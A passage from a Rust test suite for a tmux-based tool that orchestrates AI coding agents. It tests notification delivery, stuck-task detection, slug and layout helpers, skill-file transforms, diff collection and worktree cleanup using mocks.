    app.state.orchestrator_ready.store(true, Ordering::Release);
    app.state.orchestrator_last_content = "old content".to_string();

    // Insert a notification into the DB
    {
        let db = app.state.db.as_ref().unwrap();
        db.create_notification(&crate::db::Notification::new("task X completed planning"))
            .unwrap();
    }

    app.deliver_orchestrator_notifications();

    // Notifications should have been consumed (DB now empty)
    let remaining = app.state.db.as_ref().unwrap().peek_notifications().unwrap();
    assert!(remaining.is_empty());
    // Idle tracking reset
    assert!(app.state.orchestrator_last_content.is_empty());
    assert!(app.state.orchestrator_stable_since.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_orchestrator_notifications_delivers_via_stability_fallback() {
    // Content unchanged, timer ≥15s → Idle via fallback, delivers notification
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(true));
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok("same content".to_string()));
    mock_tmux
        .expect_send_keys()
        .withf(|_target, msg| msg.starts_with("[agtx]"))
        .times(1)
        .returning(|_, _| Ok(()));

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    app.state.orchestrator_last_check = Instant::now() - std::time::Duration::from_secs(10);
    app.state.orchestrator_session = Some("proj:orchestrator".to_string());
    app.state.orchestrator_ready.store(true, Ordering::Release);
    // Same content as what capture_pane returns
    app.state.orchestrator_last_content = "same content".to_string();
    // Timer has been running for 20s → stability fallback triggers
    app.state.orchestrator_stable_since = Some(Instant::now() - std::time::Duration::from_secs(20));

    {
        let db = app.state.db.as_ref().unwrap();
        db.create_notification(&crate::db::Notification::new("task Y completed running"))
            .unwrap();
    }

    app.deliver_orchestrator_notifications();

    let remaining = app.state.db.as_ref().unwrap().peek_notifications().unwrap();
    assert!(remaining.is_empty());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_orchestrator_notifications_noop_when_no_notifications() {
    // Idle orchestrator but DB has no notifications → send_keys NOT called
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(true));
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok("stuff [agtx:idle]".to_string()));
    // send_keys must NOT be called — mockall will panic if it is

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    app.state.orchestrator_last_check = Instant::now() - std::time::Duration::from_secs(10);
    app.state.orchestrator_session = Some("proj:orchestrator".to_string());
    app.state.orchestrator_ready.store(true, Ordering::Release);
    app.state.orchestrator_last_content = "old content".to_string();
    // DB has no notifications

    app.deliver_orchestrator_notifications();
    // No panic = correct (send_keys not called)
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_orchestrator_notifications_clears_state_when_window_gone() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_window_exists()
        .withf(|t| t == "proj:orchestrator")
        .returning(|_| Ok(false));

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    db.create_notification(&crate::db::Notification::new(
        "Task \"foo\" (deadbeef) completed phase: planning",
    ))
    .unwrap();

    app.state.orchestrator_last_check = Instant::now() - std::time::Duration::from_secs(10);
    app.state.orchestrator_session = Some("proj:orchestrator".to_string());
    app.state.orchestrator_ready.store(true, Ordering::Release);

    app.deliver_orchestrator_notifications();

    assert!(app.state.orchestrator_session.is_none());
    assert!(!app.state.orchestrator_ready.load(Ordering::Acquire));
    let remaining = app.state.db.as_ref().unwrap().peek_notifications().unwrap();
    assert_eq!(remaining.len(), 1, "notifications preserved for next spawn");
}

// =============================================================================
// Tests for run_orchestrator_catchup helper
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_run_orchestrator_catchup_emits_for_planning_artifact() {
    let tmp = std::env::temp_dir().join("agtx_test_catchup_planning");
    let _ = std::fs::remove_dir_all(&tmp);
    let agtx_dir = tmp.join(".agtx");
    std::fs::create_dir_all(&agtx_dir).unwrap();
    std::fs::write(agtx_dir.join("plan.md"), "# Plan").unwrap();

    let db = crate::db::Database::open_in_memory_project().unwrap();

    let mut task = Task::new("compose release notes", "claude", "proj");
    task.id = "abcdef1234".to_string();
    task.status = TaskStatus::Planning;
    task.worktree_path = Some(tmp.to_string_lossy().to_string());
    task.plugin = None; // None → bundled agtx plugin
    db.create_task(&task).unwrap();

    run_orchestrator_catchup(&db, &[task.clone()], None);

    let notifs = db.peek_notifications().unwrap();
    assert_eq!(
        notifs.len(),
        1,
        "expected exactly one catch-up notification"
    );
    assert!(
        notifs[0].message.contains("compose release notes"),
        "message should include task title, got: {}",
        notifs[0].message
    );
    assert!(
        notifs[0].message.contains("planning"),
        "message should include phase name, got: {}",
        notifs[0].message
    );

    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_run_orchestrator_catchup_deduplicates_existing_notifications() {
    let tmp = std::env::temp_dir().join("agtx_test_catchup_dedup");
    let _ = std::fs::remove_dir_all(&tmp);
    let agtx_dir = tmp.join(".agtx");
    std::fs::create_dir_all(&agtx_dir).unwrap();
    std::fs::write(agtx_dir.join("plan.md"), "# Plan").unwrap();

    let db = crate::db::Database::open_in_memory_project().unwrap();

    let mut task = Task::new("compose release notes", "claude", "proj");
    task.id = "abcdef1234".to_string();
    task.status = TaskStatus::Planning;
    task.worktree_path = Some(tmp.to_string_lossy().to_string());
    task.plugin = None;
    db.create_task(&task).unwrap();

    let expected = format!(
        "Task \"{}\" ({}) completed phase: {}",
        task.title,
        &task.id[..8],
        task.status.as_str()
    );
    db.create_notification(&crate::db::Notification::new(expected.clone()))
        .unwrap();

    run_orchestrator_catchup(&db, &[task.clone()], None);

    let notifs = db.peek_notifications().unwrap();
    assert_eq!(
        notifs.len(),
        1,
        "helper must dedupe against existing notifications"
    );

    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_run_orchestrator_catchup_skips_non_planning_or_running() {
    let tmp = std::env::temp_dir().join("agtx_test_catchup_skip");
    let _ = std::fs::remove_dir_all(&tmp);
    let agtx_dir = tmp.join(".agtx");
    std::fs::create_dir_all(&agtx_dir).unwrap();
    std::fs::write(agtx_dir.join("plan.md"), "# Plan").unwrap();

    let db = crate::db::Database::open_in_memory_project().unwrap();

    let mut task = Task::new("done task", "claude", "proj");
    task.id = "11111111ff".to_string();
    task.status = TaskStatus::Backlog;
    task.worktree_path = Some(tmp.to_string_lossy().to_string());
    task.plugin = None;
    db.create_task(&task).unwrap();

    run_orchestrator_catchup(&db, &[task.clone()], None);

    let notifs = db.peek_notifications().unwrap();
    assert!(
        notifs.is_empty(),
        "Backlog tasks must be ignored by catch-up"
    );

    let _ = std::fs::remove_dir_all(&tmp);
}

// =============================================================================
// Tests for detect_existing_orchestrator helper (TUI-startup reattachment)
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_detect_existing_orchestrator_returns_none_when_experimental_off() {
    let mock = MockTmuxOperations::new();
    let db = crate::db::Database::open_in_memory_project().unwrap();

    let result = detect_existing_orchestrator(false, &mock, "proj", Some(&db), &[], None);
    assert!(result.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_detect_existing_orchestrator_reattaches_even_when_pane_is_bash() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_window_exists()
        .withf(|t| t == "proj:orchestrator")
        .returning(|_| Ok(true));

    let db = crate::db::Database::open_in_memory_project().unwrap();
    let result = detect_existing_orchestrator(true, &mock, "proj", Some(&db), &[], None);
    assert_eq!(
        result.as_deref(),
        Some("proj:orchestrator"),
        "live window (regardless of pane command) must reattach, not respawn"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_detect_existing_orchestrator_runs_catchup() {
    let tmp = std::env::temp_dir().join("agtx_test_detect_catchup");
    let _ = std::fs::remove_dir_all(&tmp);
    let agtx_dir = tmp.join(".agtx");
    std::fs::create_dir_all(&agtx_dir).unwrap();
    std::fs::write(agtx_dir.join("plan.md"), "# Plan").unwrap();

    let mut mock = MockTmuxOperations::new();
    mock.expect_window_exists().returning(|_| Ok(true));
    mock.expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));

    let db = crate::db::Database::open_in_memory_project().unwrap();
    let mut task = Task::new("compose release notes", "claude", "proj");
    task.id = "abcdef1234".to_string();
    task.status = TaskStatus::Planning;
    task.worktree_path = Some(tmp.to_string_lossy().to_string());
    task.plugin = None;
    db.create_task(&task).unwrap();

    let tasks = vec![task];
    let result = detect_existing_orchestrator(true, &mock, "proj", Some(&db), &tasks, None);
    assert!(result.is_some());

    let notifs = db.peek_notifications().unwrap();
    assert_eq!(
        notifs.len(),
        1,
        "catch-up should have queued one notification"
    );

    let _ = std::fs::remove_dir_all(&tmp);
}

// =============================================================================
// Tests for stuck-task notification logic in apply_session_refresh
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_stuck_task_notification_fires_after_1_min_idle() {
    // Task Idle for ≥60s with orchestrator active → notification written to DB
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("stuck task", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Running;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    app.state.orchestrator_session = Some("orch-session".to_string());
    // Simulate task has been Idle for 65 seconds
    app.state.stuck_task_idle_since.insert(
        "t1".to_string(),
        Instant::now() - std::time::Duration::from_secs(65),
    );

    let result = SessionRefreshResult {
        statuses: vec![make_session_task_status(
            "t1",
            TaskStatus::Running,
            PhaseStatus::Idle,
            false,
        )],
    };
    app.apply_session_refresh(result);

    let notifs = app.state.db.as_ref().unwrap().peek_notifications().unwrap();
    assert!(
        !notifs.is_empty(),
        "should have created a stuck-task notification"
    );
    assert!(notifs[0].message.contains("stuck task"));
    assert!(notifs[0].message.contains("running"));
    assert!(notifs[0].message.contains("idle"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_stuck_task_notification_does_not_fire_before_1_min() {
    // Task Idle for only 30s → no notification yet
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("pending task", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Running;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    app.state.orchestrator_session = Some("orch-session".to_string());
    app.state.stuck_task_idle_since.insert(
        "t1".to_string(),
        Instant::now() - std::time::Duration::from_secs(30),
    );

    let result = SessionRefreshResult {
        statuses: vec![make_session_task_status(
            "t1",
            TaskStatus::Running,
            PhaseStatus::Idle,
            false,
        )],
    };
    app.apply_session_refresh(result);

    let notifs = app.state.db.as_ref().unwrap().peek_notifications().unwrap();
    assert!(
        notifs.is_empty(),
        "should not have fired notification before 1 minute"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_stuck_task_notification_fires_once_per_phase() {
    // Guard ensures notification fires only once even across multiple refreshes
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("my task", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Running;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    app.state.orchestrator_session = Some("orch-session".to_string());
    app.state.stuck_task_idle_since.insert(
        "t1".to_string(),
        Instant::now() - std::time::Duration::from_secs(65),
    );

    let make_result = || SessionRefreshResult {
        statuses: vec![make_session_task_status(
            "t1",
            TaskStatus::Running,
            PhaseStatus::Idle,
            false,
        )],
    };

    app.apply_session_refresh(make_result());
    app.apply_session_refresh(make_result());
    app.apply_session_refresh(make_result());

    let notifs = app.state.db.as_ref().unwrap().peek_notifications().unwrap();
    assert_eq!(notifs.len(), 1, "notification should fire exactly once");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_stuck_task_notification_not_fired_without_orchestrator() {
    // No orchestrator_session → no notification even after 1+ min idle
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("my task", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Running;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    // No orchestrator
    app.state.orchestrator_session = None;
    app.state.stuck_task_idle_since.insert(
        "t1".to_string(),
        Instant::now() - std::time::Duration::from_secs(65),
    );

    let result = SessionRefreshResult {
        statuses: vec![make_session_task_status(
            "t1",
            TaskStatus::Running,
            PhaseStatus::Idle,
            false,
        )],
    };
    app.apply_session_refresh(result);

    let notifs = app.state.db.as_ref().unwrap().peek_notifications().unwrap();
    assert!(notifs.is_empty(), "no notification without orchestrator");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_stuck_task_idle_since_cleared_when_not_idle() {
    // Task transitions out of Idle → idle_since timer is cleared
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("my task", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Running;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    app.state.orchestrator_session = Some("orch-session".to_string());
    app.state.stuck_task_idle_since.insert(
        "t1".to_string(),
        Instant::now() - std::time::Duration::from_secs(30),
    );

    // Task is now Working (no longer Idle)
    let result = SessionRefreshResult {
        statuses: vec![make_session_task_status(
            "t1",
            TaskStatus::Running,
            PhaseStatus::Working,
            false,
        )],
    };
    app.apply_session_refresh(result);

    assert!(
        !app.state.stuck_task_idle_since.contains_key("t1"),
        "idle_since timer should be cleared when task is no longer Idle"
    );
}

// =============================================================================
// Tests for pure functions: fuzzy_score, generate_task_slug, centered_rect,
// centered_rect_fixed_width,
// transform_skill_frontmatter, transform_skill_for_opencode
// =============================================================================

// --- fuzzy_score ---

#[test]
fn test_fuzzy_score_empty_needle_returns_one() {
    assert_eq!(fuzzy_score("anything", ""), 1);
}

#[test]
fn test_fuzzy_score_no_match_returns_zero() {
    assert_eq!(fuzzy_score("hello", "xyz"), 0);
}

#[test]
fn test_fuzzy_score_partial_match_returns_zero() {
    // needle chars not all present
    assert_eq!(fuzzy_score("abc", "abz"), 0);
}

#[test]
fn test_fuzzy_score_all_chars_present_scores_nonzero() {
    // All needle chars present → score > 0
    assert!(fuzzy_score("readme", "rdm") > 0);
    // All chars present in order, exact → highest possible for that length
    let s = fuzzy_score("readme", "readme");
    assert!(s > 0);
}

#[test]
fn test_fuzzy_score_case_sensitive() {
    // function is case-sensitive
    assert_eq!(fuzzy_score("Hello", "hello"), 0);
    assert!(fuzzy_score("hello", "hello") > 0);
}

// --- generate_task_slug ---

#[test]
fn test_generate_task_slug_basic() {
    let slug = generate_task_slug("abcdefgh-1234-5678", "My Task");
    assert!(slug.starts_with("abcdefgh-"), "slug={}", slug);
    assert!(
        slug.contains("My-Task") || slug.contains("my-task") || slug.contains("My"),
        "slug={}",
        slug
    );
}

#[test]
fn test_generate_task_slug_truncates_long_title() {
    let long_title = "a".repeat(60);
    let slug = generate_task_slug("id12345678", &long_title);
    // slug part should be <= 30 chars for the title portion
    let after_prefix = slug.trim_start_matches("id123456-");
    assert!(
        after_prefix.len() <= 30,
        "slug title part too long: {}",
        after_prefix
    );
}

#[test]
fn test_generate_task_slug_special_chars_replaced() {
    let slug = generate_task_slug("id12345678", "Fix: bug #42 (urgent)");
    // special chars become '-', alphanumeric and '-'/'_' are kept
    assert!(!slug.contains('#'), "slug={}", slug);
    assert!(!slug.contains('('), "slug={}", slug);
    assert!(!slug.contains(':'), "slug={}", slug);
}

#[test]
fn test_generate_task_slug_id_prefix_is_8_chars() {
    let slug = generate_task_slug("abcdefghijklmnop", "title");
    // First component before "-title" is 8 chars of the id
    let first_dash = slug.find('-').unwrap();
    assert_eq!(first_dash, 8, "id prefix should be 8 chars, slug={}", slug);
}

// --- centered_rect ---

#[test]
fn test_centered_rect_basic() {
    use ratatui::layout::Rect;
    let area = Rect {
        x: 0,
        y: 0,
        width: 100,
        height: 50,
    };
    let popup = centered_rect(60, 40, area);
    // x should be centered
    assert_eq!(popup.x, 20); // (100 - 60) / 2
    assert_eq!(popup.width, 60);
    assert_eq!(popup.height, 20); // 40% of 50
}

#[test]
fn test_centered_rect_full_size() {
    use ratatui::layout::Rect;
    let area = Rect {
        x: 0,
        y: 0,
        width: 80,
        height: 24,
    };
    let popup = centered_rect(100, 100, area);
    assert_eq!(popup.width, 80);
    assert_eq!(popup.height, 24);
}

// --- centered_rect_fixed_width ---

#[test]
fn test_centered_rect_fixed_width_basic() {
    use ratatui::layout::Rect;
    let area = Rect {
        x: 0,
        y: 0,
        width: 100,
        height: 50,
    };
    let popup = centered_rect_fixed_width(60, 50, area);
    assert_eq!(popup.width, 60);
    // should be centered horizontally
    assert_eq!(popup.x, 20); // (100 - 60) / 2
}

#[test]
fn test_centered_rect_fixed_width_capped_to_terminal() {
    use ratatui::layout::Rect;
    // fixed_width wider than terminal → capped at width - 4
    let area = Rect {
        x: 0,
        y: 0,
        width: 40,
        height: 24,
    };
    let popup = centered_rect_fixed_width(100, 50, area);
    assert_eq!(popup.width, 36); // 40 - 4
}

// --- transform_skill_frontmatter ---

#[test]
fn test_transform_skill_frontmatter_renames_name_field() {
    let content = "---\nname: agtx-plan\ndescription: Plan a task\n---\nContent here";
    let result = transform_skill_frontmatter(content);
    // skill_name_to_command("agtx-plan") → "/agtx:plan"
    assert!(result.contains("name: agtx:plan"), "result={}", result);
    assert!(!result.contains("name: agtx-plan"), "result={}", result);
}

#[test]
fn test_transform_skill_frontmatter_passthrough_when_no_name() {
    let content = "---\ndescription: No name field here\n---\nContent";
    let result = transform_skill_frontmatter(content);
    assert_eq!(result, content);
}

#[test]
fn test_transform_skill_frontmatter_preserves_rest_of_content() {
    let content = "---\nname: agtx-execute\ndescription: Run it\n---\nBody text here";
    let result = transform_skill_frontmatter(content);
    assert!(result.contains("description: Run it"), "result={}", result);
    assert!(result.contains("Body text here"), "result={}", result);
}

// --- transform_skill_for_opencode ---

#[test]
fn test_transform_skill_for_opencode_strips_frontmatter() {
    let content = "---\nname: agtx-plan\ndescription: Plan the task\n---\nDo the planning work.";
    let result = transform_skill_for_opencode(content);
    // Should produce OpenCode format: description frontmatter + body
    assert!(result.contains("description:"), "result={}", result);
    assert!(
        result.contains("Do the planning work."),
        "result={}",
        result
    );
    // Original name: field should not appear
    assert!(!result.contains("name: agtx-plan"), "result={}", result);
}

#[test]
fn test_transform_skill_for_opencode_uses_description_from_frontmatter() {
    let content = "---\nname: agtx-plan\ndescription: My custom desc\n---\nBody.";
    let result = transform_skill_for_opencode(content);
    assert!(result.contains("My custom desc"), "result={}", result);
}

// =============================================================================
// Tests for mock-dependent functions: is_pane_at_shell, is_agent_active,
// collect_task_diff, cleanup_task_for_done, cleanup_task_resources,
// delete_task_resources, save_task
// =============================================================================

// --- is_pane_at_shell ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_true_for_shell_command() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    assert!(is_pane_at_shell(&mock_tmux, "proj:task"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_false_when_no_command() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_pane_current_command().returning(|_| None);
    assert!(!is_pane_at_shell(&mock_tmux, "proj:task"));
}

// --- is_agent_active ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agent_active_true_when_agent_process_running() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));
    assert!(is_agent_active(&mock_tmux, "proj:task", None));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agent_active_true_when_gemini_indicator_in_pane() {
    // Gemini runs inside bash — detected via pane content indicator
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok("some output\nType your message\n".to_string()));
    assert!(is_agent_active(&mock_tmux, "proj:task", None));
}

/// pi has no banner: the only unconditional part of its footer is the context
/// display, so `%/` is what proves the TUI is up. It counts only in a pane agtx
/// knows is pi's — the same string elsewhere must not.
#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agent_active_scoped_indicator_counts_only_for_its_own_agent() {
    let pane = || Ok("cwd (main)\n0.0%/1.0M (auto)".to_string());

    let mut as_pi = MockTmuxOperations::new();
    as_pi
        .expect_pane_current_command()
        // macOS reports pi's Ink process as `node`, i.e. "at the shell".
        .returning(|_| Some("bash".to_string()));
    as_pi.expect_capture_pane().returning(move |_| pane());
    assert!(is_agent_active(&as_pi, "proj:task", Some("pi")));

    let mut as_claude = MockTmuxOperations::new();
    as_claude
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    as_claude.expect_capture_pane().returning(move |_| pane());
    assert!(!is_agent_active(&as_claude, "proj:task", Some("claude")));

    let mut as_unknown = MockTmuxOperations::new();
    as_unknown
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    as_unknown.expect_capture_pane().returning(move |_| pane());
    assert!(
        !is_agent_active(&as_unknown, "proj:task", None),
        "an unknown pane must not read a bare percent-slash as a live agent"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agent_active_false_when_at_shell_no_indicator() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok("$ ".to_string()));
    assert!(!is_agent_active(&mock_tmux, "proj:task", None));
}

// --- collect_task_diff ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_collect_task_diff_shows_unstaged_changes() {
    let mut mock_git = MockGitOperations::new();
    mock_git
        .expect_diff()
        .returning(|_| "diff --git a/foo.rs\n-old\n+new\n".to_string());
    mock_git.expect_diff_cached().returning(|_| String::new());
    mock_git
        .expect_list_untracked_files()
        .returning(|_| String::new());

    let result = collect_task_diff("/tmp/wt", &mock_git, &[]);
    assert!(result.contains("Unstaged Changes"), "result={}", result);
    assert!(result.contains("foo.rs"), "result={}", result);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_collect_task_diff_shows_staged_changes() {
    let mut mock_git = MockGitOperations::new();
    mock_git.expect_diff().returning(|_| String::new());
    mock_git
        .expect_diff_cached()
        .returning(|_| "diff --git a/bar.rs\n+added\n".to_string());
    mock_git
        .expect_list_untracked_files()
        .returning(|_| String::new());

    let result = collect_task_diff("/tmp/wt", &mock_git, &[]);
    assert!(result.contains("Staged Changes"), "result={}", result);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_collect_task_diff_untracked_excluded_by_prefix() {
    let mut mock_git = MockGitOperations::new();
    mock_git.expect_diff().returning(|_| String::new());
    mock_git.expect_diff_cached().returning(|_| String::new());
    mock_git
        .expect_list_untracked_files()
        .returning(|_| ".claude/settings.json\nsrc/new_file.rs\n".to_string());
    // diff_untracked_file only called for non-excluded files
    mock_git
        .expect_diff_untracked_file()
        .withf(|_, file: &str| file == "src/new_file.rs")
        .returning(|_, _| "+new content\n".to_string());

    let result = collect_task_diff("/tmp/wt", &mock_git, &[".claude"]);
    assert!(
        !result.contains("settings.json"),
        "excluded file appeared: {}",
        result
    );
    assert!(
        result.contains("new_file.rs") || result.contains("Untracked"),
        "result={}",
        result
    );
}

// --- cleanup_task_for_done ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_cleanup_task_for_done_clears_session_and_worktree() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_kill_window()
        .withf(|name: &str| name == "proj:task-1")
        .times(1)
        .returning(|_| Ok(()));

    let mut mock_git = MockGitOperations::new();
    mock_git
        .expect_remove_worktree()
        .times(1)
        .returning(|_, _| Ok(()));

    let mut task = make_test_task("t1", "My task", TaskStatus::Review);
    task.session_name = Some("proj:task-1".to_string());
    task.worktree_path = Some("/tmp/nonexistent-wt".to_string());

    cleanup_task_for_done(
        &mut task,
        None,
        Path::new("/tmp/proj"),
        &mock_tmux,
        &mock_git,
    );

    assert_eq!(task.status, TaskStatus::Done);
    assert!(task.session_name.is_none());
    assert!(task.worktree_path.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_cleanup_task_for_done_no_ops_when_no_session_or_worktree() {
    // No session or worktree → kill_window and remove_worktree must NOT be called
    let mock_tmux = MockTmuxOperations::new();
    let mock_git = MockGitOperations::new();

    let mut task = make_test_task("t2", "My task", TaskStatus::Review);
    task.session_name = None;
    task.worktree_path = None;

    cleanup_task_for_done(
        &mut task,
        None,
        Path::new("/tmp/proj"),
        &mock_tmux,
        &mock_git,
    );

    assert_eq!(task.status, TaskStatus::Done);
}

/// `.agtx/status/` is runtime scratch written by agent hooks, not a phase
/// artifact. The archive step only copies top-level `.md` files, so it is
/// excluded today — this pins that, since a future recursive archive would
/// otherwise start snapshotting status records.
#[test]
#[cfg(feature = "test-mocks")]
fn test_cleanup_does_not_archive_hook_status_files() {
    let mock_tmux = MockTmuxOperations::new();
    let mut mock_git = MockGitOperations::new();
    mock_git.expect_remove_worktree().returning(|_, _| Ok(()));

    let wt = tempfile::tempdir().unwrap();
    let status_dir = wt.path().join(".agtx").join("status");
    std::fs::create_dir_all(&status_dir).unwrap();
    std::fs::write(
        status_dir.join("t9.json"),
        r#"{"ts":1,"state":"working","agent":"claude"}"#,
    )
    .unwrap();

    let project_dir = tempfile::tempdir().unwrap();
    let mut task = make_test_task("t9", "Status task", TaskStatus::Review);
    task.session_name = None;
    task.worktree_path = Some(wt.path().to_string_lossy().to_string());
    task.branch_name = Some("task/my-slug".to_string());

    cleanup_task_for_done(&mut task, None, project_dir.path(), &mock_tmux, &mock_git);

    let archived = project_dir
        .path()
        .join(".agtx")
        .join("archive")
        .join("my-slug");
    assert!(
        !archived.join("status").exists() && !archived.join("t9.json").exists(),
        "hook status records must not be archived"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_cleanup_task_for_done_archives_md_files() {
    use std::io::Write;

    let mock_tmux = MockTmuxOperations::new();
    let mut mock_git = MockGitOperations::new();
    mock_git.expect_remove_worktree().returning(|_, _| Ok(()));

    // Create a worktree dir with a .agtx/*.md file
    let wt = tempfile::tempdir().unwrap();
    let agtx_dir = wt.path().join(".agtx");
    std::fs::create_dir_all(&agtx_dir).unwrap();
    let mut f = std::fs::File::create(agtx_dir.join("plan.md")).unwrap();
    writeln!(f, "# Plan").unwrap();

    let project_dir = tempfile::tempdir().unwrap();

    let mut task = make_test_task("t3", "Archive task", TaskStatus::Review);
    task.session_name = None;
    task.worktree_path = Some(wt.path().to_string_lossy().to_string());
    task.branch_name = Some("task/my-slug".to_string());

    cleanup_task_for_done(&mut task, None, project_dir.path(), &mock_tmux, &mock_git);

    // Archived file should exist under .agtx/archive/my-slug/plan.md
    let archive = project_dir
        .path()
        .join(".agtx")
        .join("archive")
        .join("my-slug")
        .join("plan.md");
    assert!(archive.exists(), "archive not created at {:?}", archive);
}

// --- cleanup_task_resources ---

#[test]
